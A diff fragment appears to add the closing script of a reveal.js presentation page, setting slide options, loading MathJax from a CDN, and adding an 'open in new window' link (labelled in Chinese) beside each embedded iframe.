+  <script>
+
+      // Full list of configuration options available at:
+      // https://github.com/hakimel/reveal.js#configuration
+      Reveal.initialize({
+        plugins: [ RevealHighlight, RevealNotes, RevealZoom, RevealMath ],
+        // Display controls in the bottom right corner
+        controls: true,
+        // Display a presentation progress bar
+        progress: true,
+        // Push each slide change to the browser history
+        history: true,
+        // Enable keyboard shortcuts for navigation
+        keyboard: true,
+        // Enable the slide overview mode
+        overview: true,
+        // Vertical centering of slides
+        center: true,
+        // Enables touch navigation on devices with touch input
+        touch: true,
+        // see https://github.com/hakimel/reveal.js/#navigation-mode
+        navigationMode: 'default',
+        // Turns fragments on and off globally
+        fragments: true,
+        // Flags if we should show a help overlay when the questionmark
+        // key is pressed
+        help: true,
+        // Number of milliseconds between automatically proceeding to the
+        // next slide, disabled when set to 0, this value can be overwritten
+        // by using a data-autoslide attribute on your slides
+        autoSlide: 0,
+        // Stop auto-sliding after user input
+        autoSlideStoppable: true,
+        // Transition style
+        transition: 'fade', // none/fade/slide/convex/concave/zoom
+        // Transition speed
+        transitionSpeed: 'default', // default/fast/slow
+        // Transition style for full page slide backgrounds
+        backgroundTransition: 'fade', // none/fade/slide/convex/concave/zoom
+        // Number of slides away from the current that are visible
+        viewDistance: 3,
+        math: {
+          mathjax: 'https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-chtml-full.js',
+          config: 'TeX-AMS_HTML-full',
+          tex2jax: {
+            inlineMath: [['\\(','\\)']],
+            displayMath: [['\\[','\\]']],
+            balanceBraces: true,
+            processEscapes: false,
+            processRefs: true,
+            processEnvironments: true,
+            preview: 'TeX',
+            skipTags: ['script','noscript','style','textarea','pre','code'],
+            ignoreClass: 'tex2jax_ignore',
+            processClass: 'tex2jax_process'
+          },
+        },
+
+      });
+
+      // Add "open in new window" button to all iframes
+      Reveal.on('ready', function() {
+        document.querySelectorAll('.slides section iframe').forEach(function(iframe) {
+          var wrapper = document.createElement('div');
+          wrapper.className = 'iframe-wrapper';
+          var link = document.createElement('a');
+          link.className = 'iframe-newwindow-btn';
+          link.href = iframe.src;
+          link.target = '_blank';
+          link.title = '在新窗口打开';
+          link.textContent = '↗ 新窗口打开';
+          iframe.parentNode.insertBefore(wrapper, iframe);
+          wrapper.appendChild(iframe);
+          wrapper.appendChild(link);
+        });
+      });
+    </script>
+    </body>
+</html>
